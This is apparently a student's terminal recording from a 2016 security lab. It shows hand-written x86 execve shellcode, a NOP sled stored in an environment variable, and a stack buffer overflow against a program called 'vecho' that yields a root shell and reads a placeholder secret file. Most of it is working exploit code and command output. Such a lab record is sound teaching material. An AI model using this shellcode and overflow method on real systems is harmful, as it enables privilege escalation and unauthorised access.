cript started on Thu 07 Apr 2016 02:02:15 PM ADT
user@ubuntu-sts:~/lab10$ cat ts.s
.section .text
.globl _start
_start:
xor  %eax, %eax
push %eax
push $0x68732f2f
push $0x6e69622f
mov  %esp, %ebx
push %eax
mov  %esp, %ecx
push %ebx
mov  %eax, %edx
mov  $0xb, %al
int  $0x80
user@ubuntu-sts:~/lab10$ as --32 ts.s -o ts.o
user@ubuntu-sts:~/lab10$ ld -Ttext 200000 --oformat binary -o shellcode.bin ts.o
user@ubuntu-sts:~/lab10$ objdump -b binary -m i386 -D shellcode.bin

shellcode.bin:     file format binary


Disassembly of section .data:

00000000 <.data>:
   0:	31 c0                	xor    %eax,%eax
   2:	50                   	push   %eax
   3:	68 2f 2f 73 68       	push   $0x68732f2f
   8:	68 2f 62 69 6e       	push   $0x6e69622f
   d:	89 e3                	mov    %esp,%ebx
   f:	50                   	push   %eax
  10:	89 e1                	mov    %esp,%ecx
  12:	53                   	push   %ebx
  13:	89 c2                	mov    %eax,%edx
  15:	b0 0b                	mov    $0xb,%al
  17:	cd 80                	int    $0x80
user@ubuntu-sts:~/lab10$ SLED=`python -c "print '\x90' * 100"`
user@ubuntu-sts:~/lab10$ export EGG=$SLED$(<shellcode.bin)
user@ubuntu-sts:~/lab10$ ./getenvaddr EGG vecho
EGG will be at 0xbffff8fc
user@ubuntu-sts:~/lab10$ ADDRESS=`echo -en "\xfc\xf8\xff\xbf"`
user@ubuntu-sts:~/lab10$ PADDING=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
user@ubuntu-sts:~/lab10$ vecho $PADDING$ADDRESS
# whoami
root
# cd /
# cat TOP_SECRET
The jam is moldy in the kitchen and the rolling rabbit gathers no moss.
# exit
user@ubuntu-sts:~/lab10$ exit
Script done on Thu 07 Apr 2016 02:06:59 PM ADT
